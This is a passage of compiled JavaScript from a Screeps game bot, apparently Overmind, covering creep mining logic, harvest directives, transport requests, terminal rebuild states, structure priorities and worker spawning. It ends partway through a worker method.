const SUICIDE_CHECK_FREQUENCY = 3;
const MINER_SUICIDE_THRESHOLD = 200;
/**
 * Spawns miners to harvest from remote, owned, or sourcekeeper energy deposits. Standard mining actions have been
 * heavily CPU-optimized
 */
let MiningOverlord = MiningOverlord_1 = class MiningOverlord extends Overlord {
    constructor(directive, priority) {
        super(directive, 'mine', priority);
        this.directive = directive;
        this.priority += this.outpostIndex * OverlordPriority.remoteRoom.roomIncrement;
        this.miners = this.zerg(Roles.drone);
        // Populate structures
        this.populateStructures();
        // Compute energy output
        if (Cartographer.roomType(this.pos.roomName) == ROOMTYPE_SOURCEKEEPER) {
            this.energyPerTick = SOURCE_ENERGY_KEEPER_CAPACITY / ENERGY_REGEN_TIME;
        }
        else if (this.colony.level >= DirectiveOutpost.settings.canSpawnReserversAtRCL) {
            this.energyPerTick = SOURCE_ENERGY_CAPACITY / ENERGY_REGEN_TIME;
        }
        else {
            this.energyPerTick = SOURCE_ENERGY_NEUTRAL_CAPACITY / ENERGY_REGEN_TIME;
        }
        this.miningPowerNeeded = Math.ceil(this.energyPerTick / HARVEST_POWER) + 1;
        // Decide operating mode
        if (Cartographer.roomType(this.pos.roomName) == ROOMTYPE_SOURCEKEEPER) {
            this.mode = 'SK';
            this.setup = Setups.drones.miners.sourceKeeper;
        }
        else if (this.colony.room.energyCapacityAvailable < StandardMinerSetupCost) {
            this.mode = 'early';
            this.setup = Setups.drones.miners.default;
        }
        else if (this.link) {
            this.mode = 'link';
            this.setup = Setups.drones.miners.default;
        }
        else {
            this.mode = 'standard';
            this.setup = Setups.drones.miners.standard;
            // todo: double miner condition
        }
        const miningPowerEach = this.setup.getBodyPotential(WORK, this.colony);
        this.minersNeeded = Math.min(Math.ceil(this.miningPowerNeeded / miningPowerEach), this.pos.availableNeighbors(true).length);
        // Allow drop mining at low levels
        this.allowDropMining = this.colony.level < MiningOverlord_1.settings.dropMineUntilRCL;
        if (this.mode != 'early' && !this.allowDropMining) {
            if (this.container) {
                this.harvestPos = this.container.pos;
            }
            else if (this.link) {
                this.harvestPos = _.find(this.link.pos.availableNeighbors(true), pos => pos.getRangeTo(this) == 1);
            }
            else {
                this.harvestPos = this.calculateContainerPos();
            }
        }
    }
    get distance() {
        return this.directive.distance;
    }
    populateStructures() {
        if (Game.rooms[this.pos.roomName]) {
            this.source = _.first(this.pos.lookFor(LOOK_SOURCES));
            this.constructionSite = _.first(this.pos.findInRange(FIND_MY_CONSTRUCTION_SITES, 2));
            this.container = this.pos.findClosestByLimitedRange(Game.rooms[this.pos.roomName].containers, 1);
            this.link = this.pos.findClosestByLimitedRange(this.colony.availableLinks, 2);
            // if (this.link) { // this won't cause repopulation problems since link rooms are always visible
            //  this.colony.linkNetwork.claimLink(this.link);
            // }
        }
    }
    refresh() {
        if (!this.room && Game.rooms[this.pos.roomName]) { // if you just gained vision of this room
            this.populateStructures();
        }
        // if (!this.allowDropMining && Game.time % 100 == 0 && !this.container && !this.link) {
        //  log.warning(`Mining site at ${this.pos.print} has no output!`);
        // }
        super.refresh();
        $.refresh(this, 'source', 'container', 'link', 'constructionSite');
    }
    /**
     * Calculate where the container output will be built for this site
     */
    calculateContainerPos() {
        // log.debug(`Computing container position for mining overlord at ${this.pos.print}...`);
        let originPos;
        if (this.colony.storage) {
            originPos = this.colony.storage.pos;
        }
        else if (this.colony.roomPlanner.storagePos) {
            originPos = this.colony.roomPlanner.storagePos;
        }
        if (originPos) {
            const path = Pathing.findShortestPath(this.pos, originPos).path;
            const pos = _.find(path, pos => pos.getRangeTo(this) == 1);
            if (pos)
                return pos;
        }
        // Shouldn't ever get here
        log.warning(`Last resort container position calculation for ${this.print}!`);
        return _.first(this.pos.availableNeighbors(true));
    }
    /**
     * Add or remove containers as needed to keep exactly one of contaner | link
     */
    addRemoveContainer() {
        if (this.allowDropMining) {
            return; // only build containers in reserved, owned, or SK rooms
        }
        // Create container if there is not already one being built and no link
        if (!this.container && !this.constructionSite && !this.link) {
            const containerPos = this.calculateContainerPos();
            const container = containerPos.lookForStructure(STRUCTURE_CONTAINER);
            if (container) {
                log.warning(`${this.print}: this.container out of sync at ${containerPos.print}`);
                this.container = container;
                return;
            }
            log.info(`${this.print}: building container at ${containerPos.print}`);
            const result = containerPos.createConstructionSite(STRUCTURE_CONTAINER);
            if (result != OK) {
                log.error(`${this.print}: cannot build container at ${containerPos.print}! Result: ${result}`);
            }
            return;
        }
        // Destroy container if link is nearby
        if (this.container && this.link) {
            // safety checks
            if (this.colony.hatchery && this.container.pos.getRangeTo(this.colony.hatchery) > 2 &&
                this.container.pos.getRangeTo(this.colony.upgradeSite) > 3) {
                log.info(`${this.print}: container and link present; destroying container at ${this.container.pos.print}`);
                this.container.destroy();
            }
        }
    }
    registerEnergyRequests() {
        if (this.container) {
            const transportCapacity = 200 * this.colony.level;
            const threshold = this.colony.stage > ColonyStage.Larva ? 0.8 : 0.5;
            if (_.sum(this.container.store) > threshold * transportCapacity) {
                this.colony.logisticsNetwork.requestOutput(this.container, {
                    resourceType: 'all',
                    dAmountdt: this.energyPerTick
                });
            }
        }
        if (this.link) {
            // If the link will be full with next deposit from the miner
            const minerCapacity = 150;
            if (this.link.energy + minerCapacity > this.link.energyCapacity) {
                this.colony.linkNetwork.requestTransmit(this.link);
            }
        }
    }
    init() {
        this.wishlist(this.minersNeeded, this.setup);
        this.registerEnergyRequests();
    }
    /**
     * Actions for handling mining at early RCL, when multiple miners and drop mining are used
     */
    earlyMiningActions(miner) {
        if (miner.room != this.room) {
            return miner.goToRoom(this.pos.roomName);
        }
        // Container mining
        if (this.container) {
            if (this.container.hits < this.container.hitsMax
                && miner.carry.energy >= Math.min(miner.carryCapacity, REPAIR_POWER * miner.getActiveBodyparts(WORK))) {
                return miner.goRepair(this.container);
            }
            else {
                if (_.sum(miner.carry) < miner.carryCapacity) {
                    return miner.goHarvest(this.source);
                }
                else {
                    return miner.goTransfer(this.container);
                }
            }
        }
        // Build output site
        if (this.constructionSite) {
            if (miner.carry.energy >= Math.min(miner.carryCapacity, BUILD_POWER * miner.getActiveBodyparts(WORK))) {
                return miner.goBuild(this.constructionSite);
            }
            else {
                return miner.goHarvest(this.source);
            }
        }
        // Drop mining
        if (this.allowDropMining) {
            miner.goHarvest(this.source);
            if (miner.carry.energy > 0.8 * miner.carryCapacity) { // try to drop on top of largest drop if full
                const biggestDrop = maxBy(miner.pos.findInRange(miner.room.droppedEnergy, 1), drop => drop.amount);
                if (biggestDrop) {
                    miner.goDrop(biggestDrop.pos, RESOURCE_ENERGY);
                }
            }
            return;
        }
    }
    /**
     * Suicide outdated miners when their replacements arrive
     */
    suicideOldMiners() {
        if (this.miners.length > this.minersNeeded && this.source) {
            // if you have multiple miners and the source is visible
            const targetPos = this.harvestPos || this.source.pos;
            const minersNearSource = _.filter(this.miners, miner => miner.pos.getRangeTo(targetPos) <= SUICIDE_CHECK_FREQUENCY);
            if (minersNearSource.length > this.minersNeeded) {
                // if you have more miners by the source than you need
                const oldestMiner = minBy(minersNearSource, miner => miner.ticksToLive || 9999);
                if (oldestMiner && (oldestMiner.ticksToLive || 9999) < MINER_SUICIDE_THRESHOLD) {
                    // if the oldest miner will die sufficiently soon
                    oldestMiner.suicide();
                    return true;
                }
            }
        }
        return false;
    }
    /**
     * Actions for handling link mining
     */
    linkMiningActions(miner) {
        // Approach mining site
        if (this.goToMiningSite(miner))
            return;
        // Link mining
        if (this.link) {
            miner.harvest(this.source);
            if (miner.carry.energy > 0.9 * miner.carryCapacity) {
                miner.transfer(this.link, RESOURCE_ENERGY);
            }
            return;
        }
        else {
            log.warning(`Link miner ${miner.print} has no link!`);
        }
    }
    /**
     * Actions for handling mining at RCL high enough to spawn ideal miner body to saturate source
     */
    standardMiningActions(miner) {
        // Approach mining site
        if (this.goToMiningSite(miner))
            return;
        // Container mining
        if (this.container) {
            if (this.container.hits < this.container.hitsMax
                && miner.carry.energy >= Math.min(miner.carryCapacity, REPAIR_POWER * miner.getActiveBodyparts(WORK))) {
                return miner.repair(this.container);
            }
            else {
                return miner.harvest(this.source);
            }
        }
        // Build output site
        if (this.constructionSite) {
            if (miner.carry.energy >= Math.min(miner.carryCapacity, BUILD_POWER * miner.getActiveBodyparts(WORK))) {
                return miner.build(this.constructionSite);
            }
            else {
                return miner.harvest(this.source);
            }
        }
        // Drop mining
        if (this.allowDropMining) {
            miner.harvest(this.source);
            if (miner.carry.energy > 0.8 * miner.carryCapacity) { // move over the drop when you're close to full
                const biggestDrop = maxBy(miner.pos.findInRange(miner.room.droppedEnergy, 1), drop => drop.amount);
                if (biggestDrop) {
                    miner.goTo(biggestDrop);
                }
            }
            if (miner.carry.energy == miner.carryCapacity) { // drop when you are full
                miner.drop(RESOURCE_ENERGY);
            }
            return;
        }
    }
    /**
     * Move onto harvesting position or near to source (depending on early/standard mode)
     */
    goToMiningSite(miner) {
        if (this.harvestPos) {
            if (!miner.pos.inRangeToPos(this.harvestPos, 0)) {
                miner.goTo(this.harvestPos);
                return true;
            }
        }
        else {
            if (!miner.pos.inRangeToPos(this.pos, 1)) {
                miner.goTo(this);
                return true;
            }
        }
        return false;
    }
    handleMiner(miner) {
        // Flee hostiles
        if (miner.flee(miner.room.fleeDefaults, { dropEnergy: true })) {
            return;
        }
        // Move onto harvesting position or near to source (depending on early/standard mode)
        if (this.mode == 'early' || !this.harvestPos) {
            if (!miner.pos.inRangeToPos(this.pos, 1)) {
                return miner.goTo(this);
            }
        }
        else {
            if (!miner.pos.inRangeToPos(this.harvestPos, 0)) {
                return miner.goTo(this.harvestPos, { range: 0 });
            }
        }
        switch (this.mode) {
            case 'early':
                return this.earlyMiningActions(miner);
            case 'link':
                return this.linkMiningActions(miner);
            case 'standard':
                return this.standardMiningActions(miner);
            case 'SK':
                return this.standardMiningActions(miner);
            case 'double':
                return this.standardMiningActions(miner);
            default:
                log.error(`UNHANDLED MINER STATE FOR ${miner.print} (MODE: ${this.mode})`);
        }
    }
    run() {
        for (const miner of this.miners) {
            this.handleMiner(miner);
        }
        if (this.room && Game.time % BUILD_OUTPUT_FREQUENCY$1 == 1) {
            this.addRemoveContainer();
        }
        if (Game.time % SUICIDE_CHECK_FREQUENCY == 0) {
            this.suicideOldMiners();
        }
    }
};
MiningOverlord.settings = {
    minLinkDistance: 10,
    dropMineUntilRCL: 3,
};
MiningOverlord = MiningOverlord_1 = __decorate([
    profile
], MiningOverlord);

// Because harvest directives are the most common, they have special shortened memory keys to minimize memory impact
const _HARVEST_MEM_PATHING = 'P';
const _HARVEST_MEM_USAGE = 'u';
const _HARVEST_MEM_DOWNTIME = 'd';
const defaultDirectiveHarvestMemory = {
    [_HARVEST_MEM_USAGE]: 1,
    [_HARVEST_MEM_DOWNTIME]: 0,
};
/**
 * Standard mining directive. Mines from an owned, remote, or source keeper room
 */
let DirectiveHarvest = class DirectiveHarvest extends Directive {
    constructor(flag) {
        super(flag);
        if (this.colony) {
            this.colony.miningSites[this.name] = this;
            this.colony.destinations.push({ pos: this.pos, order: this.memory["T" /* TICK */] || Game.time });
        }
        _.defaultsDeep(this.memory, defaultDirectiveHarvestMemory);
    }
    // Hauling distance
    get distance() {
        if (!this.memory[_HARVEST_MEM_PATHING] || Game.time >= this.memory[_HARVEST_MEM_PATHING]["X" /* EXPIRATION */]) {
            const distance = Pathing.distance(this.colony.pos, this.pos);
            const expiration = getCacheExpiration(this.colony.storage ? 5000 : 1000);
            this.memory[_HARVEST_MEM_PATHING] = {
                ["D" /* DISTANCE */]: distance,
                ["X" /* EXPIRATION */]: expiration
            };
        }
        return this.memory[_HARVEST_MEM_PATHING]["D" /* DISTANCE */];
    }
    spawnMoarOverlords() {
        // Create a mining overlord for this
        let priority = OverlordPriority.ownedRoom.mine;
        if (!(this.room && this.room.my)) {
            priority = Cartographer.roomType(this.pos.roomName) == ROOMTYPE_SOURCEKEEPER ?
                OverlordPriority.remoteSKRoom.mine : OverlordPriority.remoteRoom.mine;
        }
        this.overlords.mine = new MiningOverlord(this, priority);
    }
    init() {
    }
    run() {
        this.computeStats();
    }
    computeStats() {
        const source = this.overlords.mine.source;
        if (source && source.ticksToRegeneration == 1) {
            this.memory[_HARVEST_MEM_USAGE] = (source.energyCapacity - source.energy) / source.energyCapacity;
        }
        const container = this.overlords.mine.container;
        this.memory[_HARVEST_MEM_DOWNTIME] = +(exponentialMovingAverage(container ? +container.isFull : 0, this.memory[_HARVEST_MEM_DOWNTIME], CREEP_LIFE_TIME)).toFixed(5);
    }
};
DirectiveHarvest.directiveName = 'harvest';
DirectiveHarvest.color = COLOR_YELLOW;
DirectiveHarvest.secondaryColor = COLOR_YELLOW;
DirectiveHarvest = __decorate([
    profile
], DirectiveHarvest);

var Priority;
(function (Priority) {
    Priority[Priority["Critical"] = 0] = "Critical";
    Priority[Priority["High"] = 1] = "High";
    Priority[Priority["NormalHigh"] = 2] = "NormalHigh";
    Priority[Priority["Normal"] = 3] = "Normal";
    Priority[Priority["NormalLow"] = 4] = "NormalLow";
    Priority[Priority["Low"] = 5] = "Low";
})(Priority || (Priority = {}));
function blankPriorityQueue() {
    const queue = {};
    for (const priority in Priority) {
        queue[priority] = [];
    }
    return queue;
}

// A stripped-down version of the logistics network intended for local deliveries
/**
 * Transport request groups handle close-range prioritized resource requests, in contrast to the logistics network,
 * which handles longer-ranged requests
 */
let TransportRequestGroup = class TransportRequestGroup {
    constructor() {
        this.refresh();
    }
    refresh() {
        this.supply = blankPriorityQueue();
        this.withdraw = blankPriorityQueue();
        this.supplyByID = {};
        this.withdrawByID = {};
    }
    get needsSupplying() {
        for (const priority in this.supply) {
            if (this.supply[priority].length > 0) {
                return true;
            }
        }
        return false;
    }
    get needsWithdrawing() {
        for (const priority in this.withdraw) {
            if (this.withdraw[priority].length > 0) {
                return true;
            }
        }
        return false;
    }
    getPrioritizedClosestRequest(pos, type, filter) {
        const requests = type == 'withdraw' ? this.withdraw : this.supply;
        for (const priority in requests) {
            const targets = _.map(requests[priority], request => request.target);
            const target = pos.findClosestByRangeThenPath(targets);
            if (target) {
                let searchRequests;
                if (filter) {
                    searchRequests = _.filter(requests[priority], req => filter(req));
                }
                else {
                    searchRequests = requests[priority];
                }
                return _.find(searchRequests, request => request.target.ref == target.ref);
            }
        }
    }
    /**
     * Request for resources to be deposited into this target
     */
    requestInput(target, priority = Priority.Normal, opts = {}) {
        _.defaults(opts, {
            resourceType: RESOURCE_ENERGY,
        });
        if (opts.amount == undefined) {
            opts.amount = this.getInputAmount(target, opts.resourceType);
        }
        // Register the request
        const req = {
            target: target,
            resourceType: opts.resourceType,
            amount: opts.amount,
        };
        if (opts.amount > 0) {
            this.supply[priority].push(req);
            if (!this.supplyByID[target.id])
                this.supplyByID[target.id] = [];
            this.supplyByID[target.id].push(req);
        }
    }
    /**
     * Request for resources to be withdrawn from this target
     */
    requestOutput(target, priority = Priority.Normal, opts = {}) {
        _.defaults(opts, {
            resourceType: RESOURCE_ENERGY,
        });
        if (opts.amount == undefined) {
            opts.amount = this.getOutputAmount(target, opts.resourceType);
        }
        // Register the request
        const req = {
            target: target,
            resourceType: opts.resourceType,
            amount: opts.amount,
        };
        if (opts.amount > 0) {
            this.withdraw[priority].push(req);
            if (!this.withdrawByID[target.id])
                this.withdrawByID[target.id] = [];
            this.withdrawByID[target.id].push(req);
        }
    }
    // /* Makes a provide for every resourceType in a requestor object */
    // requestOutputAll(target: StoreStructure, priority = Priority.Normal, opts = {} as TransportRequestOptions): void {
    //  for (let resourceType in target.store) {
    //      let amount = target.store[<ResourceConstant>resourceType] || 0;
    //      if (amount > 0) {
    //          opts.resourceType = <ResourceConstant>resourceType;
    //          this.requestOutput(target, priority, opts);
    //      }
    //  }
    // }
    getInputAmount(target, resourceType) {
        if (isStoreStructure(target)) {
            return target.storeCapacity - _.sum(target.store);
        }
        else if (isEnergyStructure(target) && resourceType == RESOURCE_ENERGY) {
            return target.energyCapacity - target.energy;
        }
        else {
            if (target instanceof StructureLab) {
                if (resourceType == target.mineralType) {
                    return target.mineralCapacity - target.mineralAmount;
                }
                else if (resourceType == RESOURCE_ENERGY) {
                    return target.energyCapacity - target.energy;
                }
            }
            else if (target instanceof StructureNuker) {
                if (resourceType == RESOURCE_GHODIUM) {
                    return target.ghodiumCapacity - target.ghodium;
                }
                else if (resourceType == RESOURCE_ENERGY) {
                    return target.energyCapacity - target.energy;
                }
            }
            else if (target instanceof StructurePowerSpawn) {
                if (resourceType == RESOURCE_POWER) {
                    return target.powerCapacity - target.power;
                }
                else if (resourceType == RESOURCE_ENERGY) {
                    return target.energyCapacity - target.energy;
                }
            }
        }
        log.warning('Could not determine requestor amount!');
        return 0;
    }
    getOutputAmount(target, resourceType) {
        if (isStoreStructure(target)) {
            return target.store[resourceType];
        }
        else if (isEnergyStructure(target) && resourceType == RESOURCE_ENERGY) {
            return target.energy;
        }
        else {
            if (target instanceof StructureLab) {
                if (resourceType == target.mineralType) {
                    return target.mineralAmount;
                }
                else if (resourceType == RESOURCE_ENERGY) {
                    return target.energy;
                }
            }
            else if (target instanceof StructureNuker) {
                if (resourceType == RESOURCE_GHODIUM) {
                    return target.ghodium;
                }
                else if (resourceType == RESOURCE_ENERGY) {
                    return target.energy;
                }
            }
            else if (target instanceof StructurePowerSpawn) {
                if (resourceType == RESOURCE_POWER) {
                    return target.power;
                }
                else if (resourceType == RESOURCE_ENERGY) {
                    return target.energy;
                }
            }
        }
        log.warning('Could not determine provider amount!');
        return 0;
    }
    /**
     * Summarize the state of the transport request group to the console; useful for debugging.
     */
    summarize(ignoreEnergy = false) {
        console.log(`Supply requests ==========================`);
        for (const priority in this.supply) {
            if (this.supply[priority].length > 0) {
                console.log(`Priority: ${priority}`);
            }
            for (const request of this.supply[priority]) {
                if (ignoreEnergy && request.resourceType == RESOURCE_ENERGY)
                    continue;
                console.log(`    targetID: ${request.target.ref}  amount: ${request.amount}  ` +
                    `resourceType: ${request.resourceType}`);
            }
        }
        console.log(`Withdraw requests ========================`);
        for (const priority in this.withdraw) {
            if (this.withdraw[priority].length > 0) {
                console.log(`Priority: ${priority}`);
            }
            for (const request of this.withdraw[priority]) {
                if (ignoreEnergy && request.resourceType == RESOURCE_ENERGY)
                    continue;
                console.log(`    targetID: ${request.target.ref}  amount: ${request.amount}  ` +
                    `resourceType: ${request.resourceType}`);
            }
        }
    }
};
TransportRequestGroup = __decorate([
    profile
], TransportRequestGroup);

const TERMINAL_STATE_REBUILD = {
    name: 'rebuild',
    type: 'in/out',
    amounts: {
        [RESOURCE_ENERGY]: 25000,
    },
    tolerance: 1000
};
const REBUILD_STATE_TIMEOUT = 25000;
/**
 * Put the colony's terminal in a rebuild state, which pushes resources out of a room which is undergoing reconstruction
 */
let DirectiveTerminalRebuildState = class DirectiveTerminalRebuildState extends Directive {
    constructor(flag) {
        super(flag);
        this.refresh();
    }
    refresh() {
        super.refresh();
        // Register abandon status
        this.terminal = this.pos.lookForStructure(STRUCTURE_TERMINAL);
        if (this.terminal) {
            Overmind.terminalNetwork.registerTerminalState(this.terminal, TERMINAL_STATE_REBUILD);
        }
        if (Game.time % 25 == 0) {
            log.alert(`${this.pos.print}: rebuild terminal state active!`);
        }
    }
    spawnMoarOverlords() {
    }
    init() {
        this.alert('Rebuild terminal state active!', NotifierPriority.High);
    }
    run() {
        // Incubation directive gets removed once the colony has a command center (storage)
        if (!this.colony || !this.terminal || Game.time > (this.memory["T" /* TICK */] || 0) + REBUILD_STATE_TIMEOUT) {
            this.remove();
        }
    }
};
DirectiveTerminalRebuildState.directiveName = 'rebuildState';
DirectiveTerminalRebuildState.color = COLOR_BROWN;
DirectiveTerminalRebuildState.secondaryColor = COLOR_YELLOW;
DirectiveTerminalRebuildState = __decorate([
    profile
], DirectiveTerminalRebuildState);

/**
 * Energetics manager; makes high-level decisions based on energy amounts
 */
class Energetics {
    static lowPowerMode(colony) {
        if (colony.stage == ColonyStage.Adult) {
            if (_.sum(colony.storage.store) > this.settings.storage.total.cap &&
                colony.terminal && _.sum(colony.terminal.store) > this.settings.terminal.total.cap) {
                return true;
            }
        }
        return false;
    }
}
Energetics.settings = {
    storage: {
        total: {
            cap: STORAGE_CAPACITY - 100000,
            tolerance: 5000,
        },
        energy: {
            destroyTerminalThreshold: 200000 // won't rebuild terminal until you have this much energy in storage
        }
    },
    terminal: {
        total: {
            cap: TERMINAL_CAPACITY - 50000
        },
        energy: {
            sendSize: 25000,
            inThreshold: 25000,
            outThreshold: 100000,
            equilibrium: 50000,
            tolerance: 5000,
            tradeAmount: 10000,
        },
    },
};

/**
 * Prioritized list of what order structures should be built in
 */
const BuildPriorities = [
    STRUCTURE_SPAWN,
    STRUCTURE_TOWER,
    STRUCTURE_EXTENSION,
    STRUCTURE_STORAGE,
    STRUCTURE_TERMINAL,
    STRUCTURE_CONTAINER,
    STRUCTURE_LINK,
    STRUCTURE_EXTRACTOR,
    STRUCTURE_LAB,
    STRUCTURE_NUKER,
    STRUCTURE_OBSERVER,
    STRUCTURE_POWER_SPAWN,
    STRUCTURE_WALL,
    STRUCTURE_RAMPART,
    STRUCTURE_ROAD,
];
/**
 * Prioritized list of what order structures should be fortified in case of nuclear strike
 */
const FortifyPriorities = [
    STRUCTURE_TERMINAL,
    STRUCTURE_STORAGE,
    STRUCTURE_SPAWN,
    STRUCTURE_TOWER,
    STRUCTURE_LAB,
    STRUCTURE_NUKER,
];
/**
 * Prioritized list of what order enemy structures should be attacked in
 */
const AttackStructurePriorities = [
    STRUCTURE_SPAWN,
    STRUCTURE_TOWER,
    STRUCTURE_EXTENSION,
    STRUCTURE_LINK,
    STRUCTURE_LAB,
    STRUCTURE_NUKER,
    STRUCTURE_OBSERVER,
    STRUCTURE_EXTRACTOR,
    STRUCTURE_POWER_SPAWN,
    STRUCTURE_CONTAINER,
    STRUCTURE_ROAD,
    STRUCTURE_STORAGE,
    STRUCTURE_TERMINAL,
    STRUCTURE_RAMPART,
    STRUCTURE_WALL,
];
const AttackStructureScores = _.zipObject(_.map(AttackStructurePriorities, type => [type, AttackStructurePriorities.length - _.indexOf(AttackStructurePriorities, type)]));
/**
 * Prioritized list of what order owned structures should be demolished (and then moved) in
 */
const DemolishStructurePriorities = [
    { structureType: STRUCTURE_EXTENSION, maxRemoved: 15 },
    { structureType: STRUCTURE_SPAWN, maxRemoved: 1 },
    { structureType: STRUCTURE_CONTAINER },
    { structureType: STRUCTURE_TOWER, maxRemoved: 1 },
    { structureType: STRUCTURE_LINK },
    { structureType: STRUCTURE_LAB },
    { structureType: STRUCTURE_NUKER },
    { structureType: STRUCTURE_OBSERVER },
    // {structureType: STRUCTURE_EXTRACTOR, maxRemoved: 1}, // skip extractor; doesn't need to be relocated
    { structureType: STRUCTURE_POWER_SPAWN },
    // {structureType: STRUCTURE_ROAD}, // just let roads decay
    { structureType: STRUCTURE_CONTAINER },
    { structureType: STRUCTURE_STORAGE, maxRemoved: 1 },
    { structureType: STRUCTURE_TERMINAL, maxRemoved: 1 },
    { structureType: STRUCTURE_WALL },
    { structureType: STRUCTURE_RAMPART },
];

var WorkerOverlord_1;
/**
 * Spawns general-purpose workers, which maintain a colony, performing actions such as building, repairing, fortifying,
 * paving, and upgrading, when needed
 */
let WorkerOverlord = WorkerOverlord_1 = class WorkerOverlord extends Overlord {
    constructor(colony, priority = OverlordPriority.ownedRoom.work) {
        super(colony, 'worker', priority);
        // Compute barriers needing fortification or critical attention
        this.fortifyBarriers = $.structures(this, 'fortifyBarriers', () => _.sortBy(_.filter(this.room.barriers, s => s.hits < WorkerOverlord_1.settings.barrierHits[this.colony.level]
            && this.colony.roomPlanner.barrierPlanner.barrierShouldBeHere(s.pos)), s => s.hits), 25);
        this.criticalBarriers = $.structures(this, 'criticalBarriers', () => _.filter(this.fortifyBarriers, barrier => barrier.hits < WorkerOverlord_1.settings.barrierHits.critical), 10);
        // Generate a list of structures needing repairing (different from fortifying except in critical case)
        this.repairStructures = $.structures(this, 'repairStructures', () => _.filter(this.colony.repairables, structure => {
            if (structure.structureType == STRUCTURE_CONTAINER) {
                // only repair containers in owned room
                if (structure.pos.roomName == this.colony.name) {
                    return structure.hits < 0.5 * structure.hitsMax;
                }
                else {
                    return false;
                }
            }
            else {
                return structure.hits < structure.hitsMax;
            }
        }));
        this.dismantleStructures = [];
        const homeRoomName = this.colony.room.name;
        const defcon = this.colony.defcon;
        // Filter constructionSites to only build valid ones
        const room = this.colony.room;
        const level = this.colony.controller.level;
        this.constructionSites = _.filter(this.colony.constructionSites, function (site) {
            // If site will be more than max amount of a structure at current level, ignore (happens after downgrade)
            const structureAmount = room[site.structureType + 's'] ? room[site.structureType + 's'].length :
                (room[site.structureType] ? 1 : 0);
            if (structureAmount >= CONTROLLER_STRUCTURES[site.structureType][level]) {
                return false;
            }
            if (defcon > DEFCON.safe) {
                // Only build non-road, non-container sites in the home room if defcon is unsafe
                return site.pos.roomName == homeRoomName &&
                    site.structureType != STRUCTURE_CONTAINER &&
                    site.structureType != STRUCTURE_ROAD;
            }
            else {
                // Build all non-container sites in outpost and all sites in room if defcon is safe
                if (site.pos.roomName != homeRoomName
                    && Cartographer.roomType(site.pos.roomName) == ROOMTYPE_CONTROLLER) {
                    return site.structureType != STRUCTURE_CONTAINER &&
                        !(site.room && site.room.dangerousHostiles.length > 0);
                }
                else {
                    return true;
                }
            }
        });
        // Nuke defense ramparts needing fortification
        this.nukeDefenseRamparts = [];
        this.nukeDefenseHitsRemaining = {};
        if (this.room.find(FIND_NUKES).length > 0) {
            for (const rampart of this.colony.room.ramparts) {
                const neededHits = this.neededRampartHits(rampart);
                if (rampart.hits < neededHits) {
                    this.nukeDefenseRamparts.push(rampart);
                    this.nukeDefenseHitsRemaining[rampart.id] = neededHits - rampart.hits;
                }
            }
        }
        // Spawn boosted workers if there is significant fortifying which needs to be done
        const opts = {};
        const totalNukeDefenseHitsRemaining = _.sum(_.values(this.nukeDefenseHitsRemaining));
        const approximateRepairPowerPerLifetime = REPAIR_POWER * 50 / 3 * CREEP_LIFE_TIME;
        if (totalNukeDefenseHitsRemaining > 3 * approximateRepairPowerPerLifetime) {
            opts.boostWishlist = [boostResources.construct[3]];
        }
        // Register workers
        this.workers = this.zerg(Roles.worker, opts);
    }
    neededRampartHits(rampart) {
        let neededHits = WorkerOverlord_1.settings.barrierHits[this.colony.level];
        for (const nuke of rampart.pos.lookFor(LOOK_NUKES)) {
            neededHits += 10e6;
        }
        for (const nuke of rampart.pos.findInRange(FIND_NUKES, 3)) {
            if (nuke.pos != rampart.pos) {
                neededHits += 5e6;
            }
        }
        return neededHits;
    }
    refresh() {
        super.refresh();
        $.refresh(this, 'repairStructures', 'dismantleStructures', 'fortifyBarriers', 'criticalBarriers', 'constructionSites', 'nukeDefenseRamparts');
    }
    init() {
        const setup = this.colony.level == 1 ? Setups.workers.early : Setups.workers.default;
        const workPartsPerWorker = setup.getBodyPotential(WORK, this.colony);
        let numWorkers;
        if (this.colony.stage == ColonyStage.Larva) {
            numWorkers = $.number(this, 'numWorkers', () => {
                // At lower levels, try to saturate the energy throughput of the colony
                const MAX_WORKERS = 10; // Maximum number of workers to spawn
                const energyMinedPerTick = _.sum(_.map(this.colony.miningSites, function (site) {
                    const overlord = site.overlords.mine;
                    const miningPowerAssigned = _.sum(overlord.miners, miner => miner.getActiveBodyparts(WORK));
                    const saturation = Math.min(miningPowerAssigned / overlord.miningPowerNeeded, 1);
                    return overlord.energyPerTick * saturation;
                }));
                const energyPerTickPerWorker = 1.1 * workPartsPerWorker; // Average energy per tick when working
                const workerUptime = 0.8;
                const numWorkers = Math.ceil(energyMinedPerTick / (energyPerTickPerWorker * workerUptime));
                return Math.min(numWorkers, MAX_WORKERS);
            });
        }
        else {
            if (this.colony.roomPlanner.memory.relocating) {
                // If relocating, maintain a maximum of workers
                numWorkers = 5;
            }
            else {
                numWorkers = $.number(this, 'numWorkers', () => {
                    // At higher levels, spawn workers based on construction and repair that needs to be done
                    const MAX_WORKERS = 5; // Maximum number of workers to spawn
                    if (this.nukeDefenseRamparts.length > 0) {
                        return MAX_WORKERS;
                    }
                    const buildTicks = _.sum(this.constructionSites, site => Math.max(site.progressTotal - site.progress, 0)) / BUILD_POWER;
                    const repairTicks = _.sum(this.repairStructures, structure => structure.hitsMax - structure.hits) / REPAIR_POWER;
                    const paveTicks = _.sum(this.colony.rooms, room => this.colony.roadLogistics.energyToRepave(room)) / 1; // repairCost=1
                    let fortifyTicks = 0;
                    if (this.colony.assets.energy > WorkerOverlord_1.settings.fortifyDutyThreshold) {
                        fortifyTicks = 0.25 * _.sum(this.fortifyBarriers, barrier => Math.max(0, WorkerOverlord_1.settings.barrierHits[this.colony.level]
                            - barrier.hits)) / REPAIR_POWER;
                    }
                    // max constructionTicks for private server manually setting progress
                    let numWorkers = Math.ceil(2 * (5 * buildTicks + repairTicks + paveTicks + fortifyTicks) /
                        (workPartsPerWorker * CREEP_LIFE_TIME));
                    numWorkers = Math.min(numWorkers, MAX_WORKERS);
                    if (this.colony.controller.ticksToDowngrade <= (this.colony.level >= 4 ? 10000 : 2000)) {
                        numWorkers = Math.max(numWorkers, 1);
                    }
                    return numWorkers;
                });
            }
        }
        this.wishlist(numWorkers, setup);
    }
    repairActions(worker) {
        const target = worker.pos.findClosestByMultiRoomRange(this.repairStructures);
        if (target) {
            worker.task = Tasks.repair(target);
            return true;
        }
        else {
            return false;
        }
    }
    buildActions(worker) {
        const groupedSites = _.groupBy(this.constructionSites, site => site.structureType);
        for (const structureType of BuildPriorities) {
            if (groupedSites[structureType]) {
                const target = worker.pos.findClosestByMultiRoomRange(groupedSites[structureType]);
                if (target) {
                    worker.task = Tasks.build(target);
                    return true;
                }
            }
        }
        return false;
    }
    dismantleActions(worker) {
